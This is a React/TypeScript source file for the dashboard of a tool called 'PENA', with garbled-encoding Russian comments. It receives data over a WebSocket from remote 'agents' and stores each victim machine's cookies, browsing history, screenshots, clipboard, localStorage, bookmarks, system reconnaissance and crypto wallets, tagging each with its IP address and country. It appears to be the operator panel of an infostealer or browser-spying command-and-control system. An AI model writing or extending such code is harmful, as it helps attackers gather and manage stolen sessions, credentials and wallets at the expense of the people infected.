import React, { createContext, useContext, useReducer, useEffect, ReactNode } from 'react';

interface AgentOverview {
  status: string;
  lastPing: string;
  cpuLoad: string;
  ramUsage: string;
  hostname: string;
  os: string;
  browser: string;
  ipAddress: string;
  commands: Array<{
    time: string;
    command: string;
  }>;
}

interface AgentData {
  overview: AgentOverview | null;
  cookies: any[] | null;
  history: any[] | null;
  screenshots: any[] | null;
  clipboard: any[] | null;
  dom: any | null;
  localStorage: any | null;
  systemRecon: any | null;
  bookmarks: any | null;
  wallets: any[] | null;
}

interface AgentInfo {
  uid: string;
  host: string;
  lastSeen: string;
  lastSeenTimestamp: number; // –î–æ–±–∞–≤–ª—è–µ–º timestamp –¥–ª—è —Ç–æ—á–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
  status: 'online' | 'offline';
  systemInfo?: any;
}

interface AgentDataState {
  agents: Record<string, AgentInfo>;
  agentData: Record<string, AgentData>;
  selectedAgent: string | null;
  connectionStatus: 'connected' | 'connecting' | 'disconnected';
  errors: Record<string, string>;
}

type AgentDataAction = 
  | { type: 'SET_AGENTS'; payload: Record<string, AgentInfo> }
  | { type: 'ADD_AGENT'; payload: AgentInfo }
  | { type: 'SELECT_AGENT'; payload: string }
  | { type: 'UPDATE_AGENT_DATA'; payload: { agentUID: string; section: string; data: any } }
  | { type: 'SET_ERROR'; payload: { agentUID: string; section: string; error: string } }
  | { type: 'SET_CONNECTION_STATUS'; payload: 'connected' | 'connecting' | 'disconnected' }
  | { type: 'CLEAR_ERROR'; payload: { agentUID: string; section: string } }
  | { type: 'UPDATE_AGENT_STATUS'; payload: { uid: string; status: 'online' | 'offline'; lastSeen: string } }
  | { type: 'RENAME_AGENT'; payload: { oldUID: string; newUID: string } }
  | { type: 'DELETE_AGENT'; payload: string };

const STORAGE_KEY = 'pena_agent_data';
const AGENT_TIMEOUT_MS = 30000; // 30 —Å–µ–∫—É–Ω–¥ –±–µ–∑ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ = offline

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ç–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ localStorage
const saveToStorage = (state: AgentDataState) => {
  try {
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–ª—å–∫–æ agents –∏ selectedAgent, –±–µ–∑ agentData —á—Ç–æ–±—ã –Ω–µ –ø—Ä–µ–≤—ã—Å–∏—Ç—å –∫–≤–æ—Ç—É
    const dataToSave = {
      agents: state.agents,
      selectedAgent: state.selectedAgent
    };
    const jsonString = JSON.stringify(dataToSave);
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–º–µ—Ä –ø–µ—Ä–µ–¥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º
    if (jsonString.length > 2000000) { // ~2MB –ª–∏–º–∏—Ç
      console.warn('‚ö†Ô∏è Data too large for localStorage, skipping save');
      return;
    }
    
    localStorage.setItem(STORAGE_KEY, jsonString);
    console.log('üíæ Saved to localStorage: agents and selectedAgent');
  } catch (error) {
    console.error('‚ùå Failed to save to localStorage:', error);
    // –ü–æ–ø—ã—Ç–∫–∞ –æ—á–∏—Å—Ç–∏—Ç—å —Å—Ç–∞—Ä—ã–µ –¥–∞–Ω–Ω—ã–µ –µ—Å–ª–∏ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ
    try {
      localStorage.removeItem(STORAGE_KEY);
      console.log('üßπ Cleared localStorage due to quota error');
    } catch (clearError) {
      console.error('‚ùå Failed to clear localStorage:', clearError);
    }
  }
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –∏–∑ localStorage
const loadFromStorage = (): Partial<AgentDataState> => {
  try {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      const parsed = JSON.parse(saved);
      console.log('üìÇ Loaded from localStorage:', Object.keys(parsed));
      
      // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º agentData –∫–∞–∫ –ø—É—Å—Ç—ã–µ –æ–±—ä–µ–∫—Ç—ã
      const agentData: Record<string, AgentData> = {};
      if (parsed.agents) {
        Object.keys(parsed.agents).forEach(uid => {
          agentData[uid] = {
            overview: null,
            cookies: [],
            history: [],
            screenshots: [],
            clipboard: [],
            dom: null,
            localStorage: null,
            systemRecon: null,
            bookmarks: null,
            wallets: []
          };
        });
      }
      
      return {
        agents: parsed.agents || {},
        selectedAgent: parsed.selectedAgent || null,
        agentData
      };
    }
  } catch (error) {
    console.error('‚ùå Failed to load from localStorage:', error);
  }
  return {};
};

const initialState: AgentDataState = {
  agents: {},
  agentData: {},
  selectedAgent: null,
  connectionStatus: 'disconnected',
  errors: {},
  ...loadFromStorage() // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
};

function agentDataReducer(state: AgentDataState, action: AgentDataAction): AgentDataState {
  let newState: AgentDataState;
  
  switch (action.type) {
    case 'SET_AGENTS':
      newState = { ...state, agents: action.payload };
      break;
    
    case 'ADD_AGENT':
      console.log('üî• ADD_AGENT:', action.payload);
      
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –∞–≥–µ–Ω—Ç —É–∂–µ
      const existingAgentData = state.agentData[action.payload.uid];
      
      newState = {
        ...state,
        agents: { ...state.agents, [action.payload.uid]: action.payload },
        agentData: {
          ...state.agentData,
          [action.payload.uid]: existingAgentData || {
            // –°–æ–∑–¥–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–≥–µ–Ω—Ç–∞ –µ—â–µ –Ω–µ—Ç
            overview: null,
            cookies: [],
            history: [],
            screenshots: [],
            clipboard: [],
            dom: null,
            localStorage: null,
            systemRecon: null,
            bookmarks: null,
            wallets: []
          }
        }
      };
      break;
    
    case 'SELECT_AGENT':
      console.log('üéØ SELECT_AGENT:', action.payload);
      newState = { ...state, selectedAgent: action.payload };
      break;
    
    case 'UPDATE_AGENT_DATA':
      const { agentUID, section, data } = action.payload;
      console.log(`üìä UPDATE_AGENT_DATA: Agent=${agentUID}, Section=${section}, DataType=${typeof data}, DataLength=${Array.isArray(data) ? data.length : 'not array'}`);
      console.log('üìä Data content:', data);
      
      const currentAgentData = state.agentData[agentUID] || {
        overview: null,
        cookies: [],
        history: [],
        screenshots: [],
        clipboard: [],
        dom: null,
        localStorage: null,
        systemRecon: null,
        bookmarks: null,
        wallets: []
      };

      let updatedSectionData;
      const sectionKey = section.toLowerCase();

      // –î–ª—è –º–∞—Å—Å–∏–≤–æ–≤ - –Ω–∞–∫–∞–ø–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ, –¥–ª—è –æ–±—ä–µ–∫—Ç–æ–≤ - –∑–∞–º–µ–Ω—è–µ–º
      if (Array.isArray(data) && Array.isArray(currentAgentData[sectionKey])) {
        // –ù–∞–∫–∞–ø–ª–∏–≤–∞–µ–º –º–∞—Å—Å–∏–≤—ã (cookies, history, screenshots, clipboard, wallets)
        const existingData = currentAgentData[sectionKey] || [];
        
        if (sectionKey === 'cookies') {
          // –î–ª—è –∫—É–∫–∏—Å - –æ–±—ä–µ–¥–∏–Ω—è–µ–º –ø–æ —É–Ω–∏–∫–∞–ª—å–Ω–æ–º—É –∫–ª—é—á—É (domain + name)
          const existingCookies = existingData;
          const newCookies = data.filter(newCookie => 
            !existingCookies.some(existing => 
              existing.domain === newCookie.domain && existing.name === newCookie.name
            )
          );
          updatedSectionData = [...existingCookies, ...newCookies];
        } else if (sectionKey === 'history') {
          // –î–ª—è –∏—Å—Ç–æ—Ä–∏–∏ - –æ–±—ä–µ–¥–∏–Ω—è–µ–º –ø–æ —É–Ω–∏–∫–∞–ª—å–Ω–æ–º—É URL + timestamp
          const existingHistory = existingData;
          const newHistory = data.filter(newItem => 
            !existingHistory.some(existing => 
              existing.url === newItem.url && existing.lastVisitTime === newItem.lastVisitTime
            )
          );
          updatedSectionData = [...existingHistory, ...newHistory];
        } else if (sectionKey === 'screenshots') {
          // –î–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤ - –æ–±—ä–µ–¥–∏–Ω—è–µ–º –ø–æ filename
          const existingScreenshots = existingData;
          const newScreenshots = data.filter(newScreenshot => 
            !existingScreenshots.some(existing => 
              existing.filename === newScreenshot.filename
            )
          );
          updatedSectionData = [...existingScreenshots, ...newScreenshots];
        } else {
          // –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –º–∞—Å—Å–∏–≤–æ–≤ - –ø—Ä–æ—Å—Ç–æ –¥–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
          updatedSectionData = [...existingData, ...data];
        }
        
        console.log(`üìä Accumulated ${sectionKey}: ${existingData.length} existing + ${data.length} new = ${updatedSectionData.length} total`);
      } else {
        // –î–ª—è –Ω–µ-–º–∞—Å—Å–∏–≤–æ–≤ (overview, dom, localStorage, systemRecon, bookmarks) - –∑–∞–º–µ–Ω—è–µ–º
        updatedSectionData = data;
        console.log(`üìä Replaced ${sectionKey} with new data`);
      }
      
      newState = {
        ...state,
        agentData: {
          ...state.agentData,
          [agentUID]: {
            ...currentAgentData,
            [sectionKey]: updatedSectionData
          }
        }
      };
      
      console.log(`üìä After update - Agent ${agentUID} ${section}:`, newState.agentData[agentUID]?.[sectionKey]);
      break;

    case 'UPDATE_AGENT_STATUS':
      console.log('üîÑ UPDATE_AGENT_STATUS:', action.payload);
      const now = Date.now();
      newState = {
        ...state,
        agents: {
          ...state.agents,
          [action.payload.uid]: {
            ...state.agents[action.payload.uid],
            status: action.payload.status,
            lastSeen: action.payload.lastSeen,
            lastSeenTimestamp: now
          }
        }
      };
      break;
    
    case 'SET_ERROR':
      console.log('‚ùå SET_ERROR:', action.payload);
      newState = {
        ...state,
        errors: {
          ...state.errors,
          [`${action.payload.agentUID}_${action.payload.section}`]: action.payload.error
        }
      };
      break;
    
    case 'CLEAR_ERROR':
      const errorKey = `${action.payload.agentUID}_${action.payload.section}`;
      const { [errorKey]: removed, ...remainingErrors } = state.errors;
      newState = { ...state, errors: remainingErrors };
      break;
    
    case 'SET_CONNECTION_STATUS':
      console.log('üîå SET_CONNECTION_STATUS:', action.payload);
      newState = { ...state, connectionStatus: action.payload };
      break;
    
    case 'RENAME_AGENT':
      console.log('‚úèÔ∏è RENAME_AGENT:', action.payload);
      const { oldUID, newUID } = action.payload;
      
      // –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–µ –æ–±—ä–µ–∫—Ç—ã –±–µ–∑ —Å—Ç–∞—Ä–æ–≥–æ UID
      const { [oldUID]: removedAgent, ...restAgents } = state.agents;
      const { [oldUID]: removedData, ...restData } = state.agentData;
      
      // –î–æ–±–∞–≤–ª—è–µ–º —Å –Ω–æ–≤—ã–º UID
      const updatedAgent = { ...removedAgent, uid: newUID };
      
      newState = {
        ...state,
        agents: { ...restAgents, [newUID]: updatedAgent },
        agentData: { ...restData, [newUID]: removedData },
        selectedAgent: state.selectedAgent === oldUID ? newUID : state.selectedAgent
      };
      break;

    case 'DELETE_AGENT':
      console.log('üóëÔ∏è DELETE_AGENT:', action.payload);
      const uidToDelete = action.payload;
      
      const { [uidToDelete]: deletedAgent, ...remainingAgents } = state.agents;
      const { [uidToDelete]: deletedData, ...remainingData } = state.agentData;
      
      // –û—á–∏—â–∞–µ–º —Å–≤—è–∑–∞–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏
      const clearedErrors = Object.keys(state.errors).reduce((acc, key) => {
        if (!key.startsWith(`${uidToDelete}_`)) {
          acc[key] = state.errors[key];
        }
        return acc;
      }, {} as Record<string, string>);
      
      newState = {
        ...state,
        agents: remainingAgents,
        agentData: remainingData,
        errors: clearedErrors,
        selectedAgent: state.selectedAgent === uidToDelete ? null : state.selectedAgent
      };
      break;
    
    default:
      newState = state;
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage —Ç–æ–ª—å–∫–æ –≤–∞–∂–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è
  if (action.type !== 'SET_ERROR' && action.type !== 'CLEAR_ERROR' && action.type !== 'SET_CONNECTION_STATUS' && action.type !== 'UPDATE_AGENT_DATA') {
    saveToStorage(newState);
  }

  return newState;
}

interface AgentDataContextType {
  state: AgentDataState;
  selectAgent: (agentUID: string) => void;
  getAgentData: (agentUID: string, section: string) => any;
  hasError: (agentUID: string, section: string) => string | null;
  renameAgent: (oldUID: string, newUID: string) => void;
  deleteAgent: (uid: string) => void;
}

const AgentDataContext = createContext<AgentDataContextType | undefined>(undefined);

export const useAgentData = () => {
  const context = useContext(AgentDataContext);
  if (!context) {
    throw new Error('useAgentData must be used within AgentDataProvider');
  }
  return context;
};

interface AgentDataProviderProps {
  children: ReactNode;
}

export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }) => {
  const [state, dispatch] = useReducer(agentDataReducer, initialState);

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–æ–≤ –∞–≥–µ–Ω—Ç–æ–≤
  const checkAgentStatuses = () => {
    const now = Date.now();
    Object.values(state.agents).forEach(agent => {
      if (agent.status === 'online') {
        const timeSinceLastSeen = now - (agent.lastSeenTimestamp || 0);
        if (timeSinceLastSeen > AGENT_TIMEOUT_MS) {
          console.log(`‚è∞ Agent ${agent.uid} timeout (${timeSinceLastSeen}ms since last seen), setting to offline`);
          dispatch({
            type: 'UPDATE_AGENT_STATUS',
            payload: {
              uid: agent.uid,
              status: 'offline',
              lastSeen: agent.lastSeen
            }
          });
        }
      }
    });
  };

  useEffect(() => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å—ã –∞–≥–µ–Ω—Ç–æ–≤ –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
    const statusInterval = setInterval(checkAgentStatuses, 5000);
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [state.agents]);

  useEffect(() => {
    let ws: WebSocket | null = null;
    let reconnectTimeout: NodeJS.Timeout | null = null;

    const connectWebSocket = () => {
      dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connecting' });
      console.log('üîå Connecting to PENA backend on ws://localhost:5000/pena');

      try {
        ws = new WebSocket('ws://localhost:5000/pena');

        ws.onopen = () => {
          console.log('‚úÖ Connected to PENA backend');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connected' });
          
          if (reconnectTimeout) {
            clearTimeout(reconnectTimeout);
            reconnectTimeout = null;
          }
        };

        ws.onmessage = (event) => {
          try {
            const message = JSON.parse(event.data);
            console.log('üì® WS received:', message);

            switch (message.type) {
              case 'agent_connect':
                console.log('ü§ñ Processing agent_connect');
                if (message.data) {
                  // –£–ª—É—á—à–µ–Ω–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∏ —Å—Ç—Ä–∞–Ω—ã
                  const systemInfo = message.data.systemInfo || {};
                  const realIP = systemInfo.ipAddress || systemInfo.ip || systemInfo.publicIP || systemInfo.externalIP || '127.0.0.1';
                  
                  // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å —Å—Ç—Ä–∞–Ω—É –∏–∑ —Ä–∞–∑–Ω—ã—Ö –ø–æ–ª–µ–π
                  const country = systemInfo.country || systemInfo.countryName || systemInfo.location?.country || 'Unknown';
                  const countryCode = systemInfo.countryCode || systemInfo.country_code || systemInfo.location?.countryCode || '';
                  
                  console.log('üåç IP and location data:', { realIP, country, countryCode, systemInfo });
                  
                  // –ü–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥ –ø–æ –∫–æ–¥—É —Å—Ç—Ä–∞–Ω—ã
                  let countryFlag = 'üåç';
                  if (countryCode && countryCode.length === 2) {
                    try {
                      const codePoints = countryCode
                        .toUpperCase()
                        .split('')
                        .map(char => 127397 + char.charCodeAt(0));
                      countryFlag = String.fromCodePoint(...codePoints);
                    } catch (e) {
                      console.log('‚ùå Failed to generate flag for:', countryCode);
                    }
                  } else if (country && country !== 'Unknown') {
                    // –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –∫–∞—Ä—Ç–∞ —Å—Ç—Ä–∞–Ω –¥–ª—è —Ñ–ª–∞–≥–æ–≤
                    const countryFlags = {
                      'Russia': 'üá∑üá∫', 'Russian Federation': 'üá∑üá∫', 'RU': 'üá∑üá∫',
                      'United States': 'üá∫üá∏', 'USA': 'üá∫üá∏', 'US': 'üá∫üá∏',
                      'Ukraine': 'üá∫üá¶', 'UA': 'üá∫üá¶',
                      'Germany': 'üá©üá™', 'DE': 'üá©üá™',
                      'France': 'üá´üá∑', 'FR': 'üá´üá∑',
                      'United Kingdom': 'üá¨üáß', 'UK': 'üá¨üáß', 'GB': 'üá¨üáß',
                      'China': 'üá®üá≥', 'CN': 'üá®üá≥',
                      'Japan': 'üáØüáµ', 'JP': 'üáØüáµ',
                      'Canada': 'üá®üá¶', 'CA': 'üá®üá¶',
                      'Australia': 'üá¶üá∫', 'AU': 'üá¶üá∫',
                      'Brazil': 'üáßüá∑', 'BR': 'üáßüá∑',
                      'India': 'üáÆüá≥', 'IN': 'üáÆüá≥',
                      'Poland': 'üáµüá±', 'PL': 'üáµüá±',
                      'Netherlands': 'üá≥üá±', 'NL': 'üá≥üá±',
                      'Spain': 'üá™üá∏', 'ES': 'üá™üá∏',
                      'Italy': 'üáÆüáπ', 'IT': 'üáÆüáπ'
                    };
                    countryFlag = countryFlags[country] || countryFlags[countryCode] || 'üåç';
                  }
                  
                  const hostDisplay = `${realIP} ${countryFlag} ${country}`;
                  const now = Date.now();

                  const agentInfo: AgentInfo = {
                    uid: message.data.uid,
                    host: hostDisplay,
                    lastSeen: message.data.lastSeen || new Date().toLocaleString(),
                    lastSeenTimestamp: now,
                    status: 'online',
                    systemInfo: message.data.systemInfo
                  };
                  
                  dispatch({ type: 'ADD_AGENT', payload: agentInfo });
                  
                  if (message.data.systemInfo) {
                    const overviewData = {
                      status: 'ONLINE',
                      lastPing: agentInfo.lastSeen,
                      cpuLoad: '23.4%',
                      ramUsage: '1.2GB / 8.0GB',
                      hostname: message.data.systemInfo.hostname || 'Unknown',
                      os: message.data.systemInfo.os || 'Unknown OS',
                      browser: message.data.systemInfo.browser || 'Chrome',
                      ipAddress: realIP,
                      commands: [
                        { time: new Date().toLocaleTimeString(), command: `agent_connect(uid="${message.data.uid}")` }
                      ]
                    };

                    dispatch({
                      type: 'UPDATE_AGENT_DATA',
                      payload: {
                        agentUID: message.data.uid,
                        section: 'overview',
                        data: overviewData
                      }
                    });
                  }
                }
                break;

              case 'update_data':
                console.log('üìä Processing update_data');
                if (message.agentUID && message.section && message.data) {
                  console.log(`üìä Updating ${message.section} for agent ${message.agentUID}`);
                  console.log('üìä Raw data received:', message.data);
                  
                  dispatch({
                    type: 'UPDATE_AGENT_DATA',
                    payload: {
                      agentUID: message.agentUID,
                      section: message.section,
                      data: message.data
                    }
                  });

                  // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –∞–≥–µ–Ω—Ç–∞
                  dispatch({
                    type: 'UPDATE_AGENT_STATUS',
                    payload: {
                      uid: message.agentUID,
                      status: 'online',
                      lastSeen: new Date().toLocaleString()
                    }
                  });
                } else {
                  console.log('‚ùå Invalid update_data message:', message);
                }
                break;

              default:
                console.log('‚ùì Unknown message type:', message.type);
            }
          } catch (error) {
            console.error('‚ùå Error parsing WebSocket message:', error);
          }
        };

        ws.onclose = () => {
          console.log('üîå WebSocket connection closed. Attempting to reconnect...');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
          
          reconnectTimeout = setTimeout(() => {
            connectWebSocket();
          }, 5000);
        };

        ws.onerror = (error) => {
          console.error('‚ùå WebSocket error:', error);
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        };

      } catch (error) {
        console.error('‚ùå Failed to create WebSocket connection:', error);
        dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        
        reconnectTimeout = setTimeout(() => {
          connectWebSocket();
        }, 5000);
      }
    };

    connectWebSocket();

    return () => {
      if (reconnectTimeout) {
        clearTimeout(reconnectTimeout);
      }
      if (ws) {
        ws.close();
      }
    };
  }, []);

  const selectAgent = (agentUID: string) => {
    console.log('üéØ selectAgent called with:', agentUID);
    dispatch({ type: 'SELECT_AGENT', payload: agentUID });
  };

  const renameAgent = (oldUID: string, newUID: string) => {
    console.log('‚úèÔ∏è renameAgent called:', { oldUID, newUID });
    dispatch({ type: 'RENAME_AGENT', payload: { oldUID, newUID } });
  };

  const deleteAgent = (uid: string) => {
    console.log('üóëÔ∏è deleteAgent called:', uid);
    dispatch({ type: 'DELETE_AGENT', payload: uid });
  };

  const getAgentData = (agentUID: string, section: string) => {
    const data = state.agentData[agentUID]?.[section.toLowerCase()] || null;
    console.log(`üìä getAgentData(${agentUID}, ${section}):`, data);
    return data;
  };

  const hasError = (agentUID: string, section: string) => {
    return state.errors[`${agentUID}_${section}`] || null;
  };

  return (
    <AgentDataContext.Provider value={{ 
      state, 
      selectAgent, 
      getAgentData, 
      hasError, 
      renameAgent, 
      deleteAgent 
    }}>
      {children}
    </AgentDataContext.Provider>
  );
};
